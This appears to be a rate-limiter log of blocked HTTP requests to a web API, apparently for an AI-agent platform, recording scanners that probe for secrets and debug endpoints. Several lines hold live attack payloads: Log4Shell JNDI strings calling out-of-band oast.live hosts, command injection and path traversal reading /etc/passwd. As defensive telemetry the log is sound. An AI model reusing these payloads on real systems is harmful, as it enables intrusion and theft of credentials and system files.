2026-03-01T20:08:10.399Z | BLOCKED | IP: 128.199.182.55 | POST /api | Tier: write (10/min)
2026-03-01T20:28:40.595Z | BLOCKED | IP: 185.177.72.60 | GET /admin/settings | Tier: read (100/min)
2026-03-01T20:28:40.625Z | BLOCKED | IP: 185.177.72.60 | GET /settings | Tier: read (100/min)
2026-03-01T20:28:40.659Z | BLOCKED | IP: 185.177.72.60 | GET /_ignition/health-check | Tier: read (100/min)
2026-03-01T20:28:40.746Z | BLOCKED | IP: 185.177.72.60 | GET /__cve_probe_cve_test_404 | Tier: read (100/min)
2026-03-01T20:28:40.777Z | BLOCKED | IP: 185.177.72.60 | GET /telescope/requests | Tier: read (100/min)
2026-03-01T20:28:40.807Z | BLOCKED | IP: 185.177.72.60 | GET /horizon/api/stats | Tier: read (100/min)
2026-03-01T20:28:40.838Z | BLOCKED | IP: 185.177.72.60 | GET /_profiler | Tier: read (100/min)
2026-03-01T20:28:40.868Z | BLOCKED | IP: 185.177.72.60 | GET /_profiler/latest | Tier: read (100/min)
2026-03-01T20:28:40.905Z | BLOCKED | IP: 185.177.72.60 | GET /_profiler/open?file=.env | Tier: read (100/min)
2026-03-01T20:28:41.016Z | BLOCKED | IP: 185.177.72.60 | GET /_wdt | Tier: read (100/min)
2026-03-01T20:28:41.048Z | BLOCKED | IP: 185.177.72.60 | GET /__cve_probe_cve_test_404 | Tier: read (100/min)
2026-03-01T20:28:41.089Z | BLOCKED | IP: 185.177.72.60 | GET /__debug__/ | Tier: read (100/min)
2026-03-01T20:28:41.126Z | BLOCKED | IP: 185.177.72.60 | GET /webpack-dev-server | Tier: read (100/min)
2026-03-01T20:28:41.158Z | BLOCKED | IP: 185.177.72.60 | GET /__webpack_dev_server__/sockjs-node/info | Tier: read (100/min)
2026-03-01T20:28:41.194Z | BLOCKED | IP: 185.177.72.60 | GET /__cve_probe_cve_test_404 | Tier: read (100/min)
2026-03-01T20:28:41.400Z | BLOCKED | IP: 185.177.72.60 | GET /api/v1/namespaces/default/secrets | Tier: api (100/min)
2026-03-01T20:28:41.431Z | BLOCKED | IP: 185.177.72.60 | GET /graphql?query={__schema{types{name,fields{name}}}} | Tier: read (100/min)
2026-03-01T20:28:41.466Z | BLOCKED | IP: 185.177.72.60 | GET /server-status | Tier: read (100/min)
2026-03-01T20:28:41.497Z | BLOCKED | IP: 185.177.72.60 | GET /server-info | Tier: read (100/min)
2026-03-01T20:28:47.975Z | BLOCKED | IP: 185.177.72.60 | GET /config.js | Tier: read (100/min)
2026-03-01T20:28:48.006Z | BLOCKED | IP: 185.177.72.60 | GET /main.js | Tier: read (100/min)
2026-03-01T20:28:48.037Z | BLOCKED | IP: 185.177.72.60 | GET /env.js | Tier: read (100/min)
2026-03-01T20:28:48.068Z | BLOCKED | IP: 185.177.72.60 | GET /app.js | Tier: read (100/min)
2026-03-01T20:28:48.098Z | BLOCKED | IP: 185.177.72.60 | GET /constants.js | Tier: read (100/min)
2026-03-01T20:28:48.129Z | BLOCKED | IP: 185.177.72.60 | GET /bundle.js | Tier: read (100/min)
2026-03-01T20:28:48.159Z | BLOCKED | IP: 185.177.72.60 | GET /index.js | Tier: read (100/min)
2026-03-01T20:28:48.200Z | BLOCKED | IP: 185.177.72.60 | GET /@vite/client | Tier: read (100/min)
2026-03-01T20:28:48.235Z | BLOCKED | IP: 185.177.72.60 | GET /__env.js | Tier: read (100/min)
2026-03-01T20:28:48.267Z | BLOCKED | IP: 185.177.72.60 | GET /vendor.js | Tier: read (100/min)
2026-03-01T20:28:48.298Z | BLOCKED | IP: 185.177.72.60 | GET /env.json | Tier: read (100/min)
2026-03-01T20:28:48.339Z | BLOCKED | IP: 185.177.72.60 | GET /.vite/manifest.json | Tier: read (100/min)
2026-03-01T20:28:48.370Z | BLOCKED | IP: 185.177.72.60 | GET /manifest.json | Tier: read (100/min)
2026-03-01T20:28:48.411Z | BLOCKED | IP: 185.177.72.60 | GET /asset-manifest.json | Tier: read (100/min)
2026-03-01T20:28:48.641Z | BLOCKED | IP: 185.177.72.60 | GET /wp-content/debug.log | Tier: read (100/min)
2026-03-01T20:28:48.847Z | BLOCKED | IP: 185.177.72.60 | GET /credentials.json | Tier: read (100/min)
2026-03-01T20:28:48.878Z | BLOCKED | IP: 185.177.72.60 | GET /.vscode/sftp.json | Tier: read (100/min)
2026-03-01T20:28:48.916Z | BLOCKED | IP: 185.177.72.60 | GET /docker-compose.yml | Tier: read (100/min)
2026-03-01T20:28:48.947Z | BLOCKED | IP: 185.177.72.60 | GET /wp-json/wc/v3/payment_gateways | Tier: read (100/min)
2026-03-01T20:28:49.043Z | BLOCKED | IP: 185.177.72.60 | GET /wp-json/wc/v2/payment_gateways | Tier: read (100/min)
2026-03-01T20:28:49.078Z | BLOCKED | IP: 185.177.72.60 | GET /wp-json/wc/v3/settings/checkout | Tier: read (100/min)
2026-03-01T20:28:49.142Z | BLOCKED | IP: 185.177.72.60 | GET /wp-content/uploads/wc-logs/ | Tier: read (100/min)
2026-03-01T20:28:49.281Z | BLOCKED | IP: 185.177.72.60 | GET /api/config | Tier: api (100/min)
2026-03-01T20:28:49.312Z | BLOCKED | IP: 185.177.72.60 | GET /api/v1/config | Tier: api (100/min)
2026-03-02T18:37:30.891Z | BLOCKED | IP: 13.61.142.217 | DELETE /api/profile/agent_satptestagent3 | Tier: write (10/min)
2026-03-03T05:20:42.672Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/login/oauth2/auth | Tier: write (10/min)
2026-03-03T05:20:46.066Z | BLOCKED | IP: 85.217.170.217 | POST /api/content/ | Tier: write (10/min)
2026-03-03T05:20:46.290Z | BLOCKED | IP: 85.217.170.217 | POST /api/agent/tabs/agentData | Tier: write (10/min)
2026-03-03T05:20:47.498Z | BLOCKED | IP: 85.217.170.217 | PUT /api/v2/cmdb/system/admin/admin | Tier: write (10/min)
2026-03-03T05:20:48.451Z | BLOCKED | IP: 85.217.170.217 | POST /api/operations/ciscosb-file:form-file-upload | Tier: write (10/min)
2026-03-03T05:20:49.450Z | BLOCKED | IP: 85.217.170.217 | POST /api/runscript | Tier: write (10/min)
2026-03-03T05:20:50.907Z | BLOCKED | IP: 85.217.170.217 | POST /api/jobs/ | Tier: write (10/min)
2026-03-03T05:20:51.306Z | BLOCKED | IP: 85.217.170.217 | POST /api/authentication/login | Tier: write (10/min)
2026-03-03T05:20:51.720Z | BLOCKED | IP: 85.217.170.217 | POST /api/file/formimage | Tier: write (10/min)
2026-03-03T05:20:52.073Z | BLOCKED | IP: 85.217.170.217 | POST /api/login/ | Tier: write (10/min)
2026-03-03T05:20:52.374Z | BLOCKED | IP: 85.217.170.217 | POST /api/operator/ | Tier: write (10/min)
2026-03-03T05:20:53.025Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/users/signup | Tier: write (10/min)
2026-03-03T05:20:53.707Z | BLOCKED | IP: 85.217.170.217 | POST /api/pull | Tier: write (10/min)
2026-03-03T05:20:53.726Z | BLOCKED | IP: 85.217.170.217 | POST /api/ | Tier: write (10/min)
2026-03-03T05:20:53.925Z | BLOCKED | IP: 85.217.170.217 | POST /api/push | Tier: write (10/min)
2026-03-03T05:20:55.333Z | BLOCKED | IP: 85.217.170.217 | POST /api/v0/train | Tier: write (10/min)
2026-03-03T05:20:56.185Z | BLOCKED | IP: 85.217.170.217 | POST /api/remote | Tier: write (10/min)
2026-03-03T05:20:56.831Z | BLOCKED | IP: 85.217.170.217 | POST /api/query | Tier: write (10/min)
2026-03-03T05:20:57.049Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/validate/code | Tier: write (10/min)
2026-03-03T05:20:58.143Z | BLOCKED | IP: 85.217.170.217 | POST /api/upload | Tier: write (10/min)
2026-03-03T05:20:58.517Z | BLOCKED | IP: 85.217.170.217 | PUT /api/v2/hoverfly/middleware | Tier: write (10/min)
2026-03-03T05:20:58.876Z | BLOCKED | IP: 85.217.170.217 | POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi | Tier: write (10/min)
2026-03-03T05:20:58.979Z | BLOCKED | IP: 85.217.170.217 | POST /api/v0/compliance/profiles/search | Tier: search (30/min)
2026-03-03T05:20:59.077Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/node-load-method/customMCP | Tier: write (10/min)
2026-03-03T05:20:59.096Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/auth/force-reset-password | Tier: write (10/min)
2026-03-03T05:20:59.290Z | BLOCKED | IP: 85.217.170.217 | POST /api/v1/auths/signin | Tier: write (10/min)
2026-03-03T05:21:00.065Z | BLOCKED | IP: 85.217.170.217 | POST /api/mcp/connect | Tier: write (10/min)
2026-03-03T05:21:00.125Z | BLOCKED | IP: 85.217.170.217 | GET /public/config.json | Tier: read (100/min)
2026-03-03T05:21:00.140Z | BLOCKED | IP: 85.217.170.217 | GET /api/v1/config.json | Tier: api (100/min)
2026-03-03T05:21:00.142Z | BLOCKED | IP: 85.217.170.217 | GET /api/v2/config.json | Tier: api (100/min)
2026-03-03T05:21:00.155Z | BLOCKED | IP: 85.217.170.217 | GET /api/config.json | Tier: api (100/min)
2026-03-03T05:21:00.200Z | BLOCKED | IP: 85.217.170.217 | GET /api/jobs/Job_G9bRix/logs | Tier: api (100/min)
2026-03-03T05:21:00.673Z | BLOCKED | IP: 85.217.170.217 | GET /api/v1/repos/search?limit=1 | Tier: search (30/min)
2026-03-03T05:21:01.849Z | BLOCKED | IP: 85.217.170.217 | POST /api/Notify | Tier: write (10/min)
2026-03-03T05:21:02.023Z | BLOCKED | IP: 85.217.170.217 | GET /api/system/deviceinfo | Tier: api (100/min)
2026-03-03T05:21:02.222Z | BLOCKED | IP: 85.217.170.217 | POST /api/system/sessions | Tier: write (10/min)
2026-03-03T05:21:02.241Z | BLOCKED | IP: 85.217.170.217 | GET /api/logstash/pipeline/$%7Bjndi:ldap://$%7B:-580%7D$%7B:-579%7D.$%7BhostName%7D.username.d6j6v5e98tqd7nu0b38gxzmyoayb4hsog.oast.live/2Xghp%7D | Tier: api (100/min)
2026-03-03T05:21:02.693Z | BLOCKED | IP: 85.217.170.217 | POST /api/sonicos/auth | Tier: write (10/min)
2026-03-03T05:21:02.779Z | BLOCKED | IP: 85.217.170.217 | POST /api/login | Tier: write (10/min)
2026-03-03T05:21:02.896Z | BLOCKED | IP: 85.217.170.217 | POST /api/user/reg | Tier: write (10/min)
2026-03-03T05:21:03.166Z | BLOCKED | IP: 85.217.170.217 | POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 | Tier: write (10/min)
2026-03-03T05:21:03.308Z | BLOCKED | IP: 85.217.170.217 | GET /api/group/list | Tier: api (100/min)
2026-03-03T05:21:15.992Z | BLOCKED | IP: 85.217.170.217 | GET /api/geojson?url=${jndi:ldap://${:-753}${:-635}.${hostName}.url.d6j6v5e98tqd7nu0b38gyijxqq8w6qcwm.oast.live} | Tier: api (100/min)
2026-03-03T05:21:16.497Z | BLOCKED | IP: 85.217.170.217 | GET /api/v1.0/web/retained-data | Tier: api (100/min)
2026-03-03T05:21:16.978Z | BLOCKED | IP: 85.217.170.217 | GET /api/config | Tier: api (100/min)
2026-03-03T05:21:21.305Z | BLOCKED | IP: 85.217.170.217 | GET /api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp | Tier: api (100/min)
2026-03-03T05:21:21.494Z | BLOCKED | IP: 85.217.170.217 | GET /api/v1/serverinfo | Tier: api (100/min)
2026-03-03T05:21:22.392Z | BLOCKED | IP: 85.217.170.217 | GET /api/experimental/latest_runs | Tier: api (100/min)
2026-03-03T05:21:22.833Z | BLOCKED | IP: 85.217.170.217 | GET /api/get_device_details | Tier: api (100/min)
2026-03-03T05:21:23.755Z | BLOCKED | IP: 85.217.170.217 | GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd | Tier: api (100/min)
2026-03-04T05:16:23.962Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/github?username=0xbrainkid&agentId=agent_brainforge | Tier: verify (5/min)
2026-03-04T05:16:24.265Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/github?username=0xbrainkid&agentId=agent_brainchain | Tier: verify (5/min)
2026-03-04T05:16:24.578Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/github?username=0xbrainkid&agentId=agent_braingrowth | Tier: verify (5/min)
2026-03-04T05:20:01.952Z | BLOCKED | IP: 213.7.121.228 | POST /api/verify/twitter | Tier: verify (5/min)
2026-03-04T05:24:22.494Z | BLOCKED | IP: 213.7.121.228 | POST /api/profile/agent_braingrowth/endorse | Tier: write (10/min)
2026-03-04T05:27:46.736Z | BLOCKED | IP: 13.63.56.231 | POST /api/verify/satp/headless | Tier: verify (5/min)
2026-03-04T05:28:33.164Z | BLOCKED | IP: 13.63.56.231 | GET /api/verify/solana?agentId=agent_brainchain&address=Bq1niVKyTECn4HDxAJWiHZvRMCZndZtC113yj3Rkbroc | Tier: verify (5/min)
2026-03-04T05:29:11.594Z | BLOCKED | IP: 13.61.142.217 | GET /api/verify/github?username=0xbrainkid&agentId=agent_brainforge | Tier: verify (5/min)
2026-03-04T05:29:33.692Z | BLOCKED | IP: 13.61.142.217 | POST /api/endorse | Tier: write (10/min)
2026-03-04T05:31:55.287Z | BLOCKED | IP: 13.61.142.217 | GET /api/verify/github?username=0xbrainkid&agentId=agent_brainforge | Tier: verify (5/min)
2026-03-04T05:46:05.713Z | BLOCKED | IP: 13.63.56.231 | GET /api/verify/twitter?username=0xbrainKID&agentId=agent_brainchain | Tier: verify (5/min)
2026-03-04T05:47:05.252Z | BLOCKED | IP: 13.63.56.231 | POST /api/verify/solana?address=Bq1niVKyTECn4HDxAJWiHZvRMCZndZtC113yj3Rkbroc&agentId=agent_brainchain | Tier: verify (5/min)
2026-03-04T05:48:21.882Z | BLOCKED | IP: 13.63.56.231 | POST /api/profile/agent_brainchain/projects | Tier: write (10/min)
2026-03-04T05:50:55.895Z | BLOCKED | IP: 13.63.56.231 | POST /api/profile/agent_brainchain/verify/solana | Tier: verify (5/min)
2026-03-04T05:53:14.427Z | BLOCKED | IP: 13.63.56.231 | POST /api/profile/agent_brainchain/verify/twitter | Tier: verify (5/min)
2026-03-04T10:03:56.572Z | BLOCKED | IP: 13.63.56.231 | POST /api/verify/satp/headless | Tier: verify (5/min)
2026-03-04T10:04:00.348Z | BLOCKED | IP: 13.63.56.231 | POST /api/verify/satp/headless | Tier: verify (5/min)
2026-03-04T10:06:25.222Z | BLOCKED | IP: 13.63.56.231 | POST /api/profile/agent_brainchain/verify/agentmail | Tier: verify (5/min)
2026-03-04T11:00:24.152Z | BLOCKED | IP: 13.49.175.225 | POST /api/verify/agentmail/start | Tier: verify (5/min)
2026-03-04T15:09:17.342Z | BLOCKED | IP: 13.49.175.225 | POST /api/verify/ethereum | Tier: verify (5/min)
2026-03-06T10:48:51.294Z | BLOCKED | IP: 13.61.142.217 | POST /api/verify/twitter/initiate | Tier: verify (5/min)
2026-03-06T10:48:57.683Z | BLOCKED | IP: 13.61.142.217 | GET /api/verify/x?username=0xbrainkid | Tier: verify (5/min)
2026-03-06T10:49:02.604Z | BLOCKED | IP: 13.61.142.217 | GET /api/verify/agentmail?email=test@agentmail.to | Tier: verify (5/min)
2026-03-06T10:49:09.678Z | BLOCKED | IP: 13.61.142.217 | GET /api/verify/solana?wallet=FriU1FEpWbdgVrTcS49YV5mVv2oqN6poaVQjzq2BS5be | Tier: verify (5/min)
2026-03-06T11:46:50.230Z | BLOCKED | IP: 13.61.142.217 | POST /api/verify/x | Tier: verify (5/min)
2026-03-06T14:05:06.298Z | BLOCKED | IP: 16.16.78.208 | POST /api/verify/discord/start | Tier: verify (5/min)
2026-03-07T00:04:21.400Z | BLOCKED | IP: 13.63.56.231 | POST /api/verify/sign | Tier: verify (5/min)
2026-03-07T00:16:37.244Z | BLOCKED | IP: 13.49.175.225 | POST /api/marketplace/applications/app_4831138c413add3e/accept | Tier: write (10/min)
2026-03-07T02:01:21.956Z | BLOCKED | IP: 13.49.175.225 | POST /api/marketplace/jobs/job_25c1267aeb22de21/select/agent_brainchain | Tier: write (10/min)
2026-03-07T02:01:22.006Z | BLOCKED | IP: 13.49.175.225 | POST /api/marketplace/jobs/job_25c1267aeb22de21/select/app_4831138c413add3e | Tier: write (10/min)
2026-03-07T02:16:41.940Z | BLOCKED | IP: 13.49.175.225 | POST /api/marketplace/jobs/job_25c1267aeb22de21/applications/app_4831138c413add3e/accept | Tier: write (10/min)
2026-03-07T05:24:32.081Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/github | Tier: verify (5/min)
2026-03-07T05:24:32.340Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/solana | Tier: verify (5/min)
2026-03-07T05:24:32.599Z | BLOCKED | IP: 213.7.121.228 | GET /api/verify/twitter | Tier: verify (5/min)
2026-03-07T05:29:20.054Z | BLOCKED | IP: 13.49.175.225 | GET /api/verify/github | Tier: verify (5/min)
2026-03-07T05:29:20.109Z | BLOCKED | IP: 13.49.175.225 | GET /api/verify/solana | Tier: verify (5/min)
2026-03-07T05:29:20.162Z | BLOCKED | IP: 13.49.175.225 | GET /api/verify/x | Tier: verify (5/min)
